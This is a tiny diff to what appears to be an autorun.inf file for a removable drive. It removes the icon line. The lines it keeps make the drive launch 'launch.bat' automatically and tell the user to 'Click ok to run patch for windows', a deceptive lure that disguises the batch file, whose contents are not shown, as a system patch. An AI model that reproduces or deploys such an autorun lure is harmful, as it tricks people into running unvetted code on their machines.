@@ -1,5 +1,4 @@
 [autorun]
-icon=drive.ico
 open=launch.bat
 action=Click ok to run patch for windows
 shell\open\command=launch.bat
